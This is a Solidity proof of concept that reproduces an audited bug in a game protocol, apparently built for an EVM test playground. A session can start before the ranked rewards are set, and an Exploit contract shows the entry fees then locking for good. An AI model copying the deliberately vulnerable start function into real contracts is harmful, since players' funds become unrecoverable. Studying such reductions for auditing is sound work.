// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Majority Protocol — start without setRankedRewards locks prize pool
    (Cyfrin / Dacian, 2026-01-27 majority-protocol-v2.0, #65377)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: FixedRanksReward.setRankedRewards requires Created state,
    but SessionManager.startAndRevealGameQuestion does not require rewards
    to be configured. Game can reach Concluded; claimRewards then reverts
    RankedRewardsNotSet — entry fees permanently locked.

    Vulnerable line: start path omits rewardsConfigured check (@> VULN).
    Provenance: Engage-Protocol/engage-protocol @ cca0cb3
    Fixed: a2e353e / 96d5fbe.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    string public constant name = "USDC";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allowance");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract FixedRanksReward {
    mapping(uint256 => uint256[]) public rankedRewards;
    SessionManager public sessionManager;
    uint256 public constant BASIS_POINTS = 10_000;

    error RankedRewardsNotSet(uint256 sessionId);
    error NotCreated(uint256 sessionId);

    constructor(address _sm) {
        sessionManager = SessionManager(_sm);
    }

    /// @dev Can only set while Created — once Ongoing/Concluded, impossible.
    function setRankedRewards(uint256 sessionId, uint256[] calldata _rankedRewards) external {
        require(sessionManager.getSessionState(sessionId) == SessionManager.SessionState.Created, NotCreated(sessionId));
        rankedRewards[sessionId] = _rankedRewards;
    }

    function getReward(uint256 sessionId, address[] calldata, uint256 position, uint256 prizePool)
        external
        view
        returns (uint256 reward)
    {
        require(rankedRewards[sessionId].length > 0, RankedRewardsNotSet(sessionId));
        reward = prizePool * rankedRewards[sessionId][position] / BASIS_POINTS;
    }
}

contract SessionManager {
    enum SessionState {
        Created,
        Ongoing,
        Ended,
        Cancelled,
        Concluded
    }

    struct GamePool {
        uint256 ticketPrice;
        uint256 totalCollectedAmount;
        address token;
    }

    struct Game {
        SessionState state;
        address creator;
        address rewardStrategy;
        uint256 numContestants;
    }

    mapping(uint256 => Game) public games;
    mapping(uint256 => GamePool) public gamePools;
    mapping(uint256 => mapping(address => bool)) public contestants;
    mapping(uint256 => address[]) public winners;
    mapping(uint256 => mapping(address => bool)) public hasClaimed;
    uint256 public nextGameId = 1;
    uint256 public minimumContestants = 1;

    error RankedRewardsNotSet(uint256 sessionId); // surfaced via reward strategy

    function createGame(uint256 ticketPrice, address token, address rewardStrategy)
        external
        returns (uint256 gameId)
    {
        gameId = nextGameId++;
        games[gameId] = Game({
            state: SessionState.Created,
            creator: msg.sender,
            rewardStrategy: rewardStrategy,
            numContestants: 0
        });
        gamePools[gameId] =
            GamePool({ticketPrice: ticketPrice, totalCollectedAmount: 0, token: token});
    }

    function joinGame(uint256 _gameId) external {
        GamePool storage pool = gamePools[_gameId];
        MockToken(pool.token).transferFrom(msg.sender, address(this), pool.ticketPrice);
        pool.totalCollectedAmount += pool.ticketPrice;
        contestants[_gameId][msg.sender] = true;
        games[_gameId].numContestants++;
    }

    /// @dev Starts game WITHOUT requiring ranked rewards to be configured.
    function startAndRevealGameQuestion(uint256 _gameId) external {
        Game storage game = games[_gameId];
        require(game.state == SessionState.Created, "created");
        require(game.numContestants >= minimumContestants, "players");
        // FIX: require(IRewardStrategy(game.rewardStrategy).rewardsConfigured(_gameId), "rewards not set");
        game.state = SessionState.Ongoing; // @> VULN: starts without checking ranked rewards / numberOfWinners configured
    }

    function endGame(uint256 _gameId) external {
        require(games[_gameId].state == SessionState.Ongoing, "ongoing");
        games[_gameId].state = SessionState.Ended;
    }

    function concludeGame(uint256 _gameId, address[] calldata _winners) external {
        require(games[_gameId].state == SessionState.Ended, "ended");
        winners[_gameId] = _winners;
        games[_gameId].state = SessionState.Concluded;
    }

    function claimRewards(uint256 _gameId, uint256 position) external {
        require(games[_gameId].state == SessionState.Concluded, "concluded");
        address[] memory w = winners[_gameId];
        require(w[position] == msg.sender, "not winner");
        uint256 prizePool = gamePools[_gameId].totalCollectedAmount;
        // This reverts RankedRewardsNotSet when setRankedRewards was never called.
        uint256 reward = FixedRanksReward(games[_gameId].rewardStrategy).getReward(_gameId, w, position, prizePool);
        require(!hasClaimed[_gameId][msg.sender], "claimed");
        hasClaimed[_gameId][msg.sender] = true;
        MockToken(gamePools[_gameId].token).transfer(msg.sender, reward);
        gamePools[_gameId].totalCollectedAmount -= reward;
    }

    function getSessionState(uint256 gameId) external view returns (SessionState) {
        return games[gameId].state;
    }

    function tryClaim(uint256 _gameId, uint256 position) external returns (bool ok) {
        try this.claimRewards(_gameId, position) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Player {
    MockToken public tok;
    SessionManager public sm;

    constructor(MockToken _tok, SessionManager _sm) {
        tok = _tok;
        sm = _sm;
    }

    function fundAndJoin(uint256 gameId, uint256 fee) external {
        tok.approve(address(sm), fee);
        sm.joinGame(gameId);
    }

    function tryClaim(uint256 gameId, uint256 pos) external returns (bool) {
        try sm.claimRewards(gameId, pos) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Exploit {
    MockToken public tok; // CREATE 1
    SessionManager public sm; // CREATE 2
    FixedRanksReward public rewards; // CREATE 3
    Player public player; // CREATE 4

    uint256 public constant FEE = 10 ether;
    uint256 public constant GAME_ID = 1;

    constructor() {
        tok = new MockToken();
        sm = new SessionManager();
        rewards = new FixedRanksReward(address(sm));
        player = new Player(tok, sm);
    }

    function run() external {
        // Create game bound to FixedRanksReward — but NEVER call setRankedRewards.
        sm.createGame(FEE, address(tok), address(rewards));

        tok.mint(address(player), FEE);
        player.fundAndJoin(GAME_ID, FEE);
        require(tok.balanceOf(address(sm)) == FEE, "pool funded");

        // Start without ranked rewards configured (VULN allows this).
        sm.startAndRevealGameQuestion(GAME_ID);
        require(sm.getSessionState(GAME_ID) == SessionManager.SessionState.Ongoing, "started");

        // Progress to Concluded with player as winner.
        sm.endGame(GAME_ID);
        address[] memory w = new address[](1);
        w[0] = address(player);
        sm.concludeGame(GAME_ID, w);
        require(sm.getSessionState(GAME_ID) == SessionManager.SessionState.Concluded, "concluded");

        // Cannot set rewards now (must be Created).
        uint256[] memory ranks = new uint256[](1);
        ranks[0] = 10_000;
        try rewards.setRankedRewards(GAME_ID, ranks) {
            revert("setRankedRewards should fail post-start");
        } catch {
            // expected NotCreated
        }

        // claimRewards reverts RankedRewardsNotSet — tokens permanently locked.
        bool claimed = player.tryClaim(GAME_ID, 0);
        require(!claimed, "claim should fail");
        require(tok.balanceOf(address(sm)) == FEE, "prize pool locked forever");
        require(tok.balanceOf(address(player)) == 0, "player unpaid");
        // Cancel also impossible once Concluded in real code; we leave state Concluded.
    }
}
